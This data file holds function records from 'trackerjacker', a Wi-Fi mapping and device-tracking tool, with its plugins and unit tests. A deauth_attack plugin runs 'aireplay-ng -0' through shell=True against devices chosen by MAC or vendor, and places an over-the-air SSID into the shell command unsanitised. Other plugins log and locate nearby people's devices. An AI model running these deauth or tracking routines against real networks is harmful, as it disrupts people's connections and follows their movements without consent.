{"name": "trackerjacker.trackerjacker.linux_device_management.Dot11InterfaceManager.switch_to_channel", "code": "def switch_to_channel(self, channel_num, force=False): self.logger.debug('Switching to channel %s', channel_num) if channel_num == self.current_channel and not force: return switch_to_channel(self.iface, channel_num) self.current_channel = channel_num"}
{"name": "trackerjacker.trackerjacker.linux_device_management.Dot11InterfaceManager.add_frame", "code": "def add_frame(self, frame): self.num_frames_received_this_channel += 1"}
{"name": "trackerjacker.trackerjacker.linux_device_management.Dot11InterfaceManager.start", "code": "def start(self): self.channel_switcher_thread()"}
{"name": "trackerjacker.trackerjacker.linux_device_management.Dot11InterfaceManager.stop", "code": "def stop(self): self.stop_event.set()  if self.need_to_disable_monitor_mode_on_exit: self.logger.info('\\nDisabling monitor mode for interface: %s', self.iface)  # Try to wait long enough for the channel switching thread to see the event so # the device isn't busy when we try to disable monitor mode. time.sleep(self.time_per_channel + 1)  monitor_mode_off(self.iface) self.logger.debug('Disabled monitor mode for interface: %s', self.iface)"}
{"name": "trackerjacker.trackerjacker.ieee_mac_vendor_db.MacVendorDB.__init__", "code": "def __init__(self, oui_file=os.path.join(os.path.dirname(os.path.abspath(__file__)), 'oui.txt')): self.db = {} with open(oui_file, 'r') as f: for line in f.readlines(): mac, vendor = line.split('=', maxsplit=1) self.db[mac] = vendor.strip()"}
{"name": "trackerjacker.trackerjacker.ieee_mac_vendor_db.MacVendorDB.lookup", "code": "def lookup(self, mac): \"\"\"MAC -> Manufacturer ('48:AD:08:AA:BB:CC' -> 'HUAWEI TECHNOLOGIES CO.,LTD')\"\"\" try: oui_prefix = mac.upper().replace(':', '')[0:6] if oui_prefix in self.db: return self.db[oui_prefix] except Exception: pass  return ''"}
{"name": "trackerjacker.trackerjacker.dot11_mapper.Dot11Map.__init__", "code": "def __init__(self, map_data=None): self.lock = threading.RLock()  # Used for determining when to trim frame lists self.frame_count_by_device = collections.Counter() self.trim_every_num_frames = 50  # empirically-derived self.window = 10  # seconds  # Needed for efficiently determining if there is no ssid known for a given bssid self.bssids_associated_with_ssids = set()  # 'linksys' -> {'90:35:ab:1c:25:19', '80:81:a6:f5:29:22'} self.ssid_to_access_point = {}  # '90:35:cb:1c:25:19' -> {'bssid': '90:35:cb:1c:25:19', #       (bssid)           'ssid': 'hacker', #                         'vendor': 'Linksys', #                         'frames': [(timestamp1, num_bytes), (timestamp2, num_bytes)], #                         'signal': -75, #                         'channels': {1, 11}, #                         'devices': {'00:03:7f:84:f8:09', 'e8:51:8b:36:5e:bb'}} self.access_points = {}  # '00:03:7f:84:f8:09' -> {'signal': -60, #        (mac)            'vendor': 'Apple', #                         'frames_in': [(timestamp1, num_bytes), (timestamp2, num_bytes2)], #                         'frames_out': [(timestamp1, num_bytes)] } self.devices = {}  # Used by load_from_file factory function if map_data: self.bssids_associated_with_ssids = map_data['bssids_associated_with_ssids'] self.ssid_to_access_point = map_data['ssid_to_access_point'] self.access_points = map_data['access_points'] self.devices = map_data['devices']  self.mac_vendor_db = ieee_mac_vendor_db.MacVendorDB()"}
{"name": "trackerjacker.trackerjacker.dot11_mapper.Dot11Map.add_frame", "code": "def add_frame(self, frame): with self.lock: # Update Access Point data if frame.bssid: self.update_access_point(frame.bssid, frame)  # Update Device data for mac in frame.macs - {frame.bssid}: self.update_device(mac, frame)  # Enrich the frame by adding the ssid if not already there and if we know it if not frame.ssid and frame.bssid in self.access_points: ssid = self.access_points[frame.bssid].get('ssid', None) if ssid: frame.ssid = ssid  # TODO: Make sure beacons add 1 to frame counts (so that if looking for a threshold of 1 bytes they show up)"}
{"name": "trackerjacker.trackerjacker.dot11_mapper.Dot11Map.get_dev_node", "code": "def get_dev_node(self, mac): \"\"\"Returns ap_node associated with mac in a thread-safe manner.\"\"\" device_node = None with self.lock: if mac in self.devices: device_node = copy.deepcopy(self.devices[mac]) return device_node"}
{"name": "trackerjacker.trackerjacker.dot11_mapper.Dot11Map.get_ap_by_bssid", "code": "def get_ap_by_bssid(self, bssid): \"\"\"Returns ap_node associated with mac in a thread-safe manner.\"\"\" ap_node = None with self.lock: if bssid in self.access_points: ap_node = copy.deepcopy(self.access_points[bssid]) return ap_node"}
{"name": "trackerjacker.trackerjacker.dot11_mapper.Dot11Map.get_ap_nodes_by_ssid", "code": "def get_ap_nodes_by_ssid(self, ssid): ap_nodes = None with self.lock: if ssid in self.ssid_to_access_point: ap_bssid_list = self.ssid_to_access_point[ssid] ap_nodes = [self.get_ap_by_bssid(bssid) for bssid in ap_bssid_list] return ap_nodes"}
{"name": "trackerjacker.trackerjacker.dot11_mapper.Dot11Map.get_channels_by_mac", "code": "def get_channels_by_mac(self, mac): dev_node = self.get_dev_node(mac) return dev_node.get('channels', ()) if dev_node else ()"}
{"name": "trackerjacker.trackerjacker.dot11_mapper.Dot11Map.get_channels_by_bssid", "code": "def get_channels_by_bssid(self, bssid): ap_node = self.get_ap_by_bssid(bssid) return ap_node.get('channels', ()) if ap_node else ()"}
{"name": "trackerjacker.trackerjacker.dot11_mapper.Dot11Map.get_channels_by_ssid", "code": "def get_channels_by_ssid(self, ssid): ap_nodes = self.get_ap_nodes_by_ssid(ssid) return reduce(lambda acc, ap_chans: acc+ap_chans, [ap.get('channels', ()) for ap in ap_nodes], [])"}
{"name": "trackerjacker.trackerjacker.dot11_mapper.Dot11Map.update_access_point", "code": "def update_access_point(self, bssid, frame): if bssid in MACS_TO_IGNORE: return  if bssid not in self.access_points: ap_node = {'bssid': bssid, 'ssid': frame.ssid, 'vendor': self.mac_vendor_db.lookup(bssid), 'channels': {frame.channel}, 'devices': set(), 'frames': []} self.access_points[bssid] = ap_node  else: ap_node = self.access_points[frame.bssid]  # Associate with ssid if ssid available if frame.ssid: if frame.ssid in self.ssid_to_access_point: self.ssid_to_access_point[frame.ssid] |= {bssid} else: self.ssid_to_access_point[frame.ssid] = {bssid}  self.bssids_associated_with_ssids |= {bssid}  # Make sure we didn't previously categorize this as an unknown_ssid missing_ssid_name = 'unknown_ssid_{}'.format(bssid) if missing_ssid_name in self.ssid_to_access_point: self.ssid_to_access_point[frame.ssid] |= self.ssid_to_access_point.pop(missing_ssid_name) elif bssid not in self.bssids_associated_with_ssids: # If no ssid is known, use the ssid name \"unknown_ssid_80:21:46:af:28:66\" missing_ssid_name = 'unknown_ssid_{}'.format(bssid) if missing_ssid_name in self.ssid_to_access_point: self.ssid_to_access_point[missing_ssid_name] |= {bssid} else: self.ssid_to_access_point[missing_ssid_name] = {bssid}  if frame.signal_strength: ap_node['signal'] = frame.signal_strength  # Only associate with channels and devices for data packets since, for example, APs # send beacons on channels that they don't actually communicate on. if frame.frame_type() == dot11_frame.Dot11Frame.DOT11_FRAME_TYPE_DATA: ap_node['devices'] |= (frame.macs - MACS_TO_IGNORE - {bssid}) ap_node['channels'] |= {frame.channel}  ap_node['frames'].append((time.time(), frame.frame_bytes))  # Trim old frames (those that are older than window) self.frame_count_by_device[bssid] += 1 if self.frame_count_by_device[bssid] % self.trim_every_num_frames == 0: ap_node['frames'] = trim_frames_to_window(ap_node['frames'], self.window)"}
{"name": "trackerjacker.trackerjacker.dot11_mapper.Dot11Map.update_device", "code": "def update_device(self, mac, frame): if mac in MACS_TO_IGNORE: return  if mac not in self.devices: dev_node = {'vendor': self.mac_vendor_db.lookup(mac), 'signal': frame.signal_strength, 'frames_in': [], 'frames_out': []} self.devices[mac] = dev_node else: dev_node = self.devices[mac]  dev_node['signal'] = frame.signal_strength  if mac == frame.src: dev_node['frames_out'].append((time.time(), frame.frame_bytes)) elif mac == frame.dst: dev_node['frames_in'].append((time.time(), frame.frame_bytes))  # Trim old frames (those that are older than window) self.frame_count_by_device[mac] += 1 if self.frame_count_by_device[mac] % self.trim_every_num_frames == 0: dev_node['frames_out'] = trim_frames_to_window(dev_node['frames_out'], self.window) dev_node['frames_in'] = trim_frames_to_window(dev_node['frames_in'], self.window)"}
{"name": "trackerjacker.trackerjacker.dot11_mapper.Dot11Map.save_to_file", "code": "def save_to_file(self, file_path): \"\"\"Serializes to file_path in a YAML format something like this:  example_ssid_name: 80:29:94:14:8a:1d: channels: - 6 - 11 signal: -86 vendor: Google, Inc. devices: f4:f5:d8:2b:9f:f6: signal: -84 vendor: Apple bytes_transfered: 200 00:25:00:ff:94:73: signal: -55 vendor: Google, Inc. bytes_transfered: 138 71:29:94:14:8a:1d: ... example_ssid_2: ...  Note that the bytes_in/out are lossily summarized in this process (and they are dropped upon map load, which only takes place on program start). \"\"\"  with self.lock: serialized_map = {} dev_map = {mac: self._with_frames_summed(self.devices[mac]) for mac in self.devices}  associated_devices = set()  for ssid in self.ssid_to_access_point: serialized_map[ssid] = {}  associated_devices |= set(self.ssid_to_access_point[ssid])  for bssid in self.ssid_to_access_point[ssid]: serialized_map[ssid][bssid] = copy.deepcopy(self.access_points[bssid]) serialized_map[ssid][bssid]['bytes'] = sum([num_bytes for _, num_bytes in serialized_map[ssid][bssid].pop('frames', ())]) serialized_map[ssid][bssid]['devices'] = {mac: copy.deepcopy(dev_map[mac]) for mac in self.access_points[bssid]['devices']}  associated_devices |= set(serialized_map[ssid][bssid]['devices'].keys())  unassociated_devices = set(self.devices.keys()) - associated_devices serialized_map['~unassociated_devices'] = {mac: dev_map[mac] for mac in unassociated_devices}  with open(file_path, 'w') as f: pyaml.dump(serialized_map, f, vspacing=[1, 0], safe=True)"}
{"name": "trackerjacker.trackerjacker.dot11_mapper.Dot11Map._with_frames_summed", "code": "def _with_frames_summed(dev_node): \"\"\"Helper function to aid in serialization.\"\"\" dev_node = copy.deepcopy(dev_node) frames_in = sum([num_bytes for _, num_bytes in dev_node.pop('frames_in', ())]) frames_out = sum([num_bytes for _, num_bytes in dev_node.pop('frames_out', ())]) dev_node['bytes'] = frames_in + frames_out return dev_node"}
{"name": "trackerjacker.trackerjacker.dot11_mapper.Dot11Map.load_from_file", "code": "def load_from_file(file_path): \"\"\"Factory function to load a Dot11Map from file_path provided.\"\"\" with open(file_path, 'r') as f: yaml_data = f.read()  yaml = ruamel.yaml.YAML(typ='safe') map_data = yaml.load(yaml_data)  # If file is empty, return empty map if not map_data: return Dot11Map()  bssids_associated_with_ssids = set() ssid_to_access_point = {} access_points = {} devices = {}  for ssid, ssid_entry in map_data.items(): if ssid == '~unassociated_devices': # ~unassociated_devices is not an SSID, but a special name to denote the list of devices # not associated with any network, so it needs to be processed differently. for mac, dev_node in ssid_entry.items(): dev_node.pop('bytes') dev_node['frames_out'] = [] dev_node['frames_in'] = [] devices[mac] = dev_node continue  unknown_ssid = ssid.startswith('unknown_ssid_')  for bssid, ap_node in ssid_entry.items(): if not unknown_ssid: bssids_associated_with_ssids |= {bssid}  # Clean up access_point nodes ap_node = {k: v for k, v in ap_node.items() if k not in {'bssid', 'ssid', 'bytes'}}  # We serialize by reducing the list of frames to a summation of the bytes, but loading back, # we replace that with an empty list. This means frames data is intentionally lost in serialize/load. ap_node['frames'] = [] ap_node['channels'] = set(ap_node['channels'])  if ssid not in ssid_to_access_point: ssid_to_access_point[ssid] = {bssid} else: ssid_to_access_point[ssid] |= {bssid}  access_points[bssid] = ap_node  for mac, dev_node in ap_node['devices'].items(): dev_node.pop('bytes') dev_node['frames_out'] = [] dev_node['frames_in'] = [] devices[mac] = dev_node  ap_node['devices'] = set([mac for mac in ap_node.pop('devices').keys()])  dot11_map = Dot11Map({ 'bssids_associated_with_ssids': bssids_associated_with_ssids, 'ssid_to_access_point': ssid_to_access_point, 'access_points': access_points, 'devices': devices }) return dot11_map"}
{"name": "trackerjacker.plugin_examples.plugin_example1.Trigger.__init__", "code": "def __init__(self): # dev_id -> [timestamp1, timestamp2, ...] self.seen_at_times = {}"}
{"name": "trackerjacker.plugin_examples.plugin_example1.Trigger.__call__", "code": "def __call__(self, dev_id=None, **kwargs): \"\"\"Note that we can specify any subset of arguments we care about... in this case, just dev_id.\"\"\" if dev_id not in self.seen_at_times: self.seen_at_times[dev_id] = [time.time()] else: self.seen_at_times[dev_id].append(time.time())  print('{} seen at: {}'.format(dev_id, self.seen_at_times[dev_id]))"}
{"name": "trackerjacker.plugin_examples.foxhunt_plugin_simple.Trigger.__init__", "code": "def __init__(self): # Maps from dev_id to last seen signal/power level self.dev_to_power = {}"}
{"name": "trackerjacker.plugin_examples.foxhunt_plugin_simple.Trigger.__call__", "code": "def __call__(self, dev_id=None, dev_type=None, power=None, **kwargs): # Only look at individual devices (device and bssids), and only look when power is present if (not power) or (not dev_id) or (dev_type == 'ssid'): return self.dev_to_power[dev_id] = power for power, dev_id in  heapq.nlargest(TOP_N_TO_SHOW, [(power, mac) for mac, power in self.dev_to_power.items()]): print('{}dBm\\t{}'.format(power, dev_id))"}
{"name": "trackerjacker.plugin_examples.builtin_plugins.foxhunt.Trigger.__init__", "code": "def __init__(self): self.dev_to_power = {} self.dev_to_vendor = {} self.dev_to_last_seen = {} self.frame_count = 0  # Pronounce a curse self.stdscr = curses.initscr() curses.noecho() curses.cbreak() self.num_to_show = 30  # Default until we get number of lines"}
{"name": "trackerjacker.plugin_examples.builtin_plugins.foxhunt.Trigger.__call__", "code": "def __call__(self, dev_id=None, dev_type=None, power=None, vendor=None, **kwargs): # Only look at individual devices (device and bssids), and only look when power is present if (not power) or (not dev_id) or (dev_type == 'ssid') or (dev_id in DEVS_TO_IGNORE): return  self.frame_count += 1 self.dev_to_power[dev_id] = power self.dev_to_vendor[dev_id] = vendor self.dev_to_last_seen[dev_id] = time.time() self.decay_items() self.show_top_devices()"}
{"name": "trackerjacker.plugin_examples.builtin_plugins.foxhunt.Trigger.show_top_devices", "code": "def show_top_devices(self): top_devices = [] num_lines = self.stdscr.getmaxyx()[0] num_devices_to_show = num_lines - 2  # 2 lines for header for _, dev_id in heapq.nlargest(num_devices_to_show, [(power, mac) for mac, power in self.dev_to_power.items()]): top_devices.append({'dev_id': dev_id, 'power': self.dev_to_power[dev_id], 'vendor': self.dev_to_vendor[dev_id]}) try: self.show_list(top_devices) except Exception as e: # Ignore any screen drawing exceptions with open('debug.txt', 'a') as f: f.write('Error in foxhunt: {}'.format(e))"}
{"name": "trackerjacker.plugin_examples.builtin_plugins.foxhunt.Trigger.show_list", "code": "def show_list(self, top_devices): self.stdscr.erase() header = '{:>7}        {:<17}        {}'.format('POWER', 'DEVICE ID', 'VENDOR') lines = '=' * 7 + ' ' * 8 + '=' * 17 + ' ' * 8 + '=' * 32 self.stdscr.addstr(0, 0, header) self.stdscr.addstr(1, 0, lines) for index, device in enumerate(top_devices): msg = '{:>4}dBm        {:<17}        '.format(device['power'], device['dev_id']) if device['vendor']: msg += '{}'.format(device['vendor']) self.stdscr.addstr(index + 2, 0, msg) self.stdscr.refresh()"}
{"name": "trackerjacker.plugin_examples.builtin_plugins.foxhunt.Trigger.decay_items", "code": "def decay_items(self): # Only decay ever 100 frames (for efficiency) and don't bother removing items if we are under the limit if self.frame_count % 100 != 0 or len(self.dev_to_power) <= self.num_to_show: return  # Don't bother removing items if we are under the limit  num_items_to_remove = len(self.dev_to_power) - self.num_to_show for _, dev_id in heapq.nsmallest(num_items_to_remove, [(last_seen, mac) for mac, last_seen in self.dev_to_last_seen.items()]): self.dev_to_last_seen.pop(dev_id) self.dev_to_vendor.pop(dev_id) self.dev_to_power.pop(dev_id)"}
{"name": "trackerjacker.plugin_examples.builtin_plugins.foxhunt.Trigger.__del__", "code": "def __del__(self): curses.echo() curses.nocbreak() curses.endwin()"}
{"name": "trackerjacker.plugin_examples.deauth_attack.Trigger.__init__", "code": "def __init__(self, mac_to_deauth=None, vendor_to_deauth=None, deauth_count=3): if not mac_to_deauth and not vendor_to_deauth: raise Exception('deauth_attack requires either \"mac_to_deauth\" or \"vendor_to_deauth\"')  self.mac_to_deauth = mac_to_deauth self.vendor_to_deauth = vendor_to_deauth self.deauth_count = deauth_count print('deauth_mac plugin - looking for {}'.format(mac_to_deauth))"}
{"name": "trackerjacker.plugin_examples.deauth_attack.Trigger.__call__", "code": "def __call__(self, dev_id=None, vendor=None, ssid=None, bssid=None, iface=None, **kwargs): if ((self.mac_to_deauth and dev_id == self.mac_to_deauth) or (self.vendor_to_deauth and self.vendor_fuzzy_match(vendor))):  print('Saw MAC ({}) on bssid={}, ssid={}, iface={}, vendor={}'.format(dev_id, bssid, ssid, iface, vendor)) if iface: if bssid and bssid.lower() not in {'00:00:00:00:00:00', 'ff:ff:ff:ff:ff:ff'}: print('\\tDeauthing {}'.format(dev_id)) deauth_cmd = 'aireplay-ng -0 {count} -a {bssid} -c {mac} {iface}'.format(count=self.deauth_count, bssid=bssid, iface=iface, mac=dev_id) print('\\tDeauth cmd: {}'.format(deauth_cmd)) subprocess.call(deauth_cmd, shell=True) return elif ssid: print('\\tDeauthing {}'.format(dev_id)) deauth_cmd = 'aireplay-ng -0 {count} -e {ssid} -c {mac} {iface}'.format(count=self.deauth_count, ssid=ssid, iface=iface, mac=dev_id) print('\\tDeauth cmd: {}'.format(deauth_cmd)) subprocess.call(deauth_cmd, shell=True) return  print('\\tNot enough data to deauth - need ssid or bssid')"}
{"name": "trackerjacker.plugin_examples.deauth_attack.Trigger.vendor_fuzzy_match", "code": "def vendor_fuzzy_match(self, vendor): if not vendor: return False return self.vendor_to_deauth.lower() in vendor.lower()"}
{"name": "trackerjacker.plugin_examples.find_nearby_strangers.Trigger.__init__", "code": "def __init__(self): self.mac_to_seen = {} self.last_save = time.time() if os.path.exists(SAVE_FILE): with open(SAVE_FILE, 'rb') as f: self.mac_to_seen = pickle.load(f) print('Loaded {} devices from disk: {}'.format(len(self.mac_to_seen), list(self.mac_to_seen.keys())))"}
{"name": "trackerjacker.plugin_examples.find_nearby_strangers.Trigger.__call__", "code": "def __call__(self, dev_id=None, dev_type=None, power=None, vendor=None, **kwargs): # Only look at individual devices (device and bssids), and only look when power is present if ((not power) or (not dev_id) or (dev_type == 'ssid') or (dev_id in DEVS_TO_IGNORE) or (power < POWER_THRESHOLD)): return  seen_first_time = False  if dev_id not in self.mac_to_seen: seen_first_time = True last_seen = time.time() self.mac_to_seen[dev_id] = [last_seen] else: last_seen = self.mac_to_seen[dev_id][-1] self.mac_to_seen[dev_id].append(time.time())  if time.time() - last_seen > TIME_THRESHOLD: self.alert_stranger(dev_id, vendor, last_seen, power) elif seen_first_time: self.alert_stranger(dev_id, vendor, last_seen, power, first_seen=True)  if time.time() - self.last_save > SAVE_PERIOD: self.save_to_disk()"}
{"name": "trackerjacker.plugin_examples.find_nearby_strangers.Trigger.alert_stranger", "code": "def alert_stranger(self, dev_id, vendor, last_seen, power, first_seen=False): # visual indicator if first_seen: msg = '[!] ' else: msg = '[*] '  # timestamp msg += '{} - '.format(str(datetime.datetime.now().replace(microsecond=0)))  # device id msg += '{} '.format(dev_id) if vendor: msg += '({}) '.format(vendor)  # spotted at msg += 'spotted at {:+d} '.format(power)  # last seen if first_seen: msg += '(never before seen)' else: msg += '(last seen {} seconds ago)'.format(int(time.time() - last_seen))  # actually display msg print(msg)"}
{"name": "trackerjacker.plugin_examples.find_nearby_strangers.Trigger.save_to_disk", "code": "def save_to_disk(self): with open(SAVE_FILE, 'wb') as f: pickle.dump(self.mac_to_seen, f)"}
{"name": "trackerjacker.tests.test_macvendordb.MacVendorDBTest.setUp", "code": "def setUp(self): self.mac_vendor_db = ieee_mac_vendor_db.MacVendorDB()"}
{"name": "trackerjacker.tests.test_macvendordb.MacVendorDBTest.test_channel_parsing", "code": "def test_channel_parsing(self): oui_tests = { 'a4:c0:e1:7d:7e:32': 'Nintendo Co., Ltd.', 'c0:56:27:2a:4c:15': 'Belkin International Inc.', 'f4:f5:d8:b8:c8:64': 'Google, Inc.', '8c:8e:f2:4e:87:c7': 'Apple, Inc.', 'e4:11:5b:75:b4:68': 'Hewlett Packard' }  for mac, vendor in oui_tests.items(): self.assertEqual(vendor, self.mac_vendor_db.lookup(mac))"}
{"name": "trackerjacker.tests.test_config_management.TestParseWatchList.test_list_basic", "code": "def test_list_basic(self): # Test basic MAC-only string test1 = 'aa:bb:cc:dd:ee:ff' parsed = cm.parse_command_line_watch_list(test1) self.assertEqual(parsed, {'aa:bb:cc:dd:ee:ff': {'threshold': None, 'power': None}})"}
{"name": "trackerjacker.tests.test_config_management.TestParseWatchList.test_2_macs", "code": "def test_2_macs(self): test2 = 'aa:bb:cc:dd:ee:ff, 11:22:33:44:55:66' parsed = cm.parse_command_line_watch_list(test2) self.assertEqual(parsed, {'aa:bb:cc:dd:ee:ff': {'threshold': None, 'power': None}, '11:22:33:44:55:66': {'threshold': None, 'power': None}})"}
{"name": "trackerjacker.tests.test_config_management.TestParseWatchList.test_2_macs_explicit", "code": "def test_2_macs_explicit(self): \"\"\" Test 2 devices with explicitly setting threshold and power. \"\"\" test3 = 'aa:bb:cc:dd:ee:ff=1000, 11:22:33:44:55:66=-32' parsed = cm.parse_command_line_watch_list(test3) self.assertEqual(parsed, {'aa:bb:cc:dd:ee:ff': {'threshold': 1000, 'power': None}, '11:22:33:44:55:66': {'threshold': None, 'power': -32}})"}
{"name": "trackerjacker.tests.test_config_management.TestCommandLineBasics.test_default_config", "code": "def test_default_config(self): # Just making sure I understand how parse_args works cmd_line_args = cm.get_arg_parser().parse_args([]) self.assertEqual(cmd_line_args.do_map, False) cmd_line_args = cm.get_arg_parser().parse_args(['--map']) self.assertEqual(cmd_line_args.do_map, True)  # Test overriding the map_file cmd_line_args = cm.get_arg_parser().parse_args([]) config = cm.build_config(cmd_line_args) self.assertEqual(config['map_file'], 'wifi_map.yaml')"}
{"name": "trackerjacker.tests.test_config_management.TestCommandLineBasics.test_override_config", "code": "def test_override_config(self): cmd_line_args = cm.get_arg_parser().parse_args(['--map-file', 'my_network.yaml']) config = cm.build_config(cmd_line_args) self.assertEqual(config['map_file'], 'my_network.yaml')"}
{"name": "trackerjacker.tests.test_config_management.TestCommandLineBasics.test_config_macs_to_watch_default_threshold_to_1", "code": "def test_config_macs_to_watch_default_threshold_to_1(self): cmd_line_args = cm.get_arg_parser().parse_args(['--track', '-m', '7C:70:BC:78:70:21']) config = cm.build_config(cmd_line_args) self.assertEqual(config['devices_to_watch'], {'7C:70:BC:78:70:21': {'threshold': 1, 'power': None,}})"}
{"name": "trackerjacker.tests.test_config_management.TestCommandLineBasics.test_config_macs_to_watch_explicit_threshold", "code": "def test_config_macs_to_watch_explicit_threshold(self): \"\"\" Test setting an explicit threshold. \"\"\" cmd_line_args = cm.get_arg_parser().parse_args(['--track', '-m', '7C:70:BC:78:70:21=100']) config = cm.build_config(cmd_line_args) self.assertEqual(config['devices_to_watch'], {'7C:70:BC:78:70:21': {'threshold': 100, 'power': None}})"}
{"name": "trackerjacker.tests.test_config_management.TestCommandLineBasics.test_config_macs_to_watch_explicit_threshold_multiple", "code": "def test_config_macs_to_watch_explicit_threshold_multiple(self): cmd_line_args = cm.get_arg_parser().parse_args(['--track', '-m', '7C:70:BC:78:70:21=100,aa:bb:cc:dd:ee:ff']) config = cm.build_config(cmd_line_args) self.assertEqual(config['devices_to_watch'], {'7C:70:BC:78:70:21': {'threshold': 100, 'power': None}, 'aa:bb:cc:dd:ee:ff': {'threshold': 1, 'power': None}})"}
{"name": "trackerjacker.tests.test_config_management.TestCommandLineBasics.test_config_macs_to_watch_power_and_threshold", "code": "def test_config_macs_to_watch_power_and_threshold(self): \"\"\" Test setting power and threshold. \"\"\" cmd_line_args = cm.get_arg_parser().parse_args(['--track', '-m', '7C:70:BC:78:70:21=100,aa:bb:cc:dd:ee:ff=-50']) config = cm.build_config(cmd_line_args) self.assertEqual(config['devices_to_watch'], {'7C:70:BC:78:70:21': {'threshold': 100, 'power': None}, 'aa:bb:cc:dd:ee:ff': {'threshold': None, 'power': -50}})"}
{"name": "trackerjacker.tests.test_config_management.TestCommandLineBasics.test_config_macs_to_watch_general_threshold", "code": "def test_config_macs_to_watch_general_threshold(self): \"\"\" Test that general threshold is used if no explicit specified. \"\"\" cmd_line_args = cm.get_arg_parser().parse_args(['--track', '-m', '7C:70:BC:78:70:21,aa:bb:cc:dd:ee:ff', '--threshold', '1337']) config = cm.build_config(cmd_line_args) self.assertEqual(config['devices_to_watch'], {'7C:70:BC:78:70:21': {'threshold': 1337, 'power': None}, 'aa:bb:cc:dd:ee:ff': {'threshold': 1337, 'power': None}})"}
{"name": "trackerjacker.tests.test_config_management.TestCommandLineGeneralPower.test_config_macs_to_watch_power", "code": "def test_config_macs_to_watch_power(self): \"\"\" Test that general threshold is used if no explicit specified. \"\"\" cmd_line_args = cm.get_arg_parser().parse_args(['--track', '-m', '7C:70:BC:78:70:21,aa:bb:cc:dd:ee:ff', '--power', '-42']) config = cm.build_config(cmd_line_args) self.assertEqual(config['devices_to_watch'], {'7C:70:BC:78:70:21': {'threshold': None, 'power': -42}, 'aa:bb:cc:dd:ee:ff': {'threshold': None, 'power': -42}})"}
{"name": "trackerjacker.tests.test_config_management.TestCommandLinePower.test_config_macs_to_watch_mixed_override", "code": "def test_config_macs_to_watch_mixed_override(self): \"\"\" Test that we can have explicitly-set threshold and still get general power. \"\"\" cmd_line_args = cm.get_arg_parser().parse_args(['--track', '-m', '7C:70:BC:78:70:21=123,aa:bb:cc:dd:ee:ff', '--power', '-42']) config = cm.build_config(cmd_line_args) self.assertEqual(config['devices_to_watch'], {'7C:70:BC:78:70:21': {'threshold': 123, 'power': None}, 'aa:bb:cc:dd:ee:ff': {'threshold': None, 'power': -42}})"}
{"name": "trackerjacker.tests.test_config_management.TestCommandLineExplicitPowerGeneralThreshold.test_config_macs_to_watch_mixed_override_reverse", "code": "def test_config_macs_to_watch_mixed_override_reverse(self): \"\"\" Test that we can have explicitly-set power and still get general threshold. \"\"\" cmd_line_args = cm.get_arg_parser().parse_args(['--track', '-m', '7C:70:BC:78:70:21=-22,11:bb:cc:dd:ee:ff', '--threshold', '1024']) config = cm.build_config(cmd_line_args) self.assertEqual(config['devices_to_watch'], {'7C:70:BC:78:70:21': {'threshold': None, 'power': -22}, '11:bb:cc:dd:ee:ff': {'threshold': 1024, 'power': None}})"}
{"name": "trackerjacker.tests.test_config_management.TestCommandLineApsToWatch.test_config_aps_to_watch", "code": "def test_config_aps_to_watch(self): \"\"\" Test setting explicit threshold and power, and test ssid. \"\"\" cmd_line_args = cm.get_arg_parser().parse_args(['--track', '-a', '7C:70:BC:78:70:21=100,my_network']) config = cm.build_config(cmd_line_args) self.assertEqual(config['aps_to_watch'], {'7C:70:BC:78:70:21': {'threshold': 100, 'power': None}, 'my_network': {'threshold': 1, 'power': None}})"}
{"name": "trackerjacker.tests.test_dot11map.Dot11MapperTest.test_trim_frames_to_window", "code": "def test_trim_frames_to_window(self): frames = [(1521090725, 0), (1521090726, 100), (1521090727, 200), (1521090728, 300), (1521090729, 400), (1521090730, 500), (1521090731, 600), (1521090732, 700), (1521090733, 800), (1521090734, 900), (1521090735, 1000), (1521090736, 1100), (1521090737, 1200), (1521090738, 1300), (1521090739, 1400), (1521090740, 1500)] expected_trimmed_frames = [(1521090736, 1100), (1521090737, 1200), (1521090738, 1300), (1521090739, 1400), (1521090740, 1500)] now = 1521090740.4395268 window = 5  # seconds trimmed_frames = dot11_mapper.trim_frames_to_window(frames, window, now=now) self.assertEqual(expected_trimmed_frames, trimmed_frames)"}
